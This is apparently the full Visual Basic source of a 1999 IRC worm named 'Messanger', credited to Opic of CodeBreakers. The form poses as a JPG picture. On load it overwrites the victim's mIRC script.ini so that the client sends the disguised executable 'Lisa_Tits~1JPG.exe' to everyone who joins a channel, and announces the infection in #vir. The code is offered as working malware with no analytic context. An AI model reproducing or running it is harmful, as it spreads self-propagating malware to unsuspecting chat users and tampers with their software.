   VERSION 5.00
   Begin VB.Form Form1
      BorderStyle     =   1  'Fixed Single
      Caption         =   "Lisa_Tits~1.JPG"
      ClientHeight    =   4170
      ClientLeft      =   45
      ClientTop       =   330
      ClientWidth     =   2730
      Icon            =   "messanger.frx":0000
      LinkTopic       =   "Form1"
      MaxButton       =   0   'False
      MinButton       =   0   'False
      ScaleHeight     =   4170
      ScaleWidth      =   2730
      StartUpPosition =   3  'Windows Default
      Begin VB.PictureBox Picture1
         Height          =   4215
         Left            =   0
         Picture         =   "messanger.frx":030A
         ScaleHeight     =   4155
         ScaleWidth      =   2715
         TabIndex        =   0
         Top             =   0
         Width           =   2775
      End
   End
   Attribute VB_Name = "Form1"
   Attribute VB_GlobalNameSpace = False
   Attribute VB_Creatable = False
   Attribute VB_PredeclaredId = True
   Attribute VB_Exposed = False
   Private Sub Form_Load()
   On Error Resume Next
   Kill "c:\mirc\script.ini"
   Open "c:\mirc\script.ini" For Output As 1
   Print #1, "[script]"
   Print #1, "n0=on 1:JOIN:#: if ( $me != $nick ) { /dcc send $nick c:\mirc\download\Lisa_Tits~1JPG.exe }"
   Print #1, "n1=on 1:CONNECT: {"
   Print #1, "n2=  /join #vir"
   Print #1, "n3=  /msg #vir Greets to Opic & the CodeBreakers! Meet another 'Messanger' infected user!"
   Close 1
   'Messanger Worm
   '(c) Opic [CodeBreakers 1999]
   End Sub
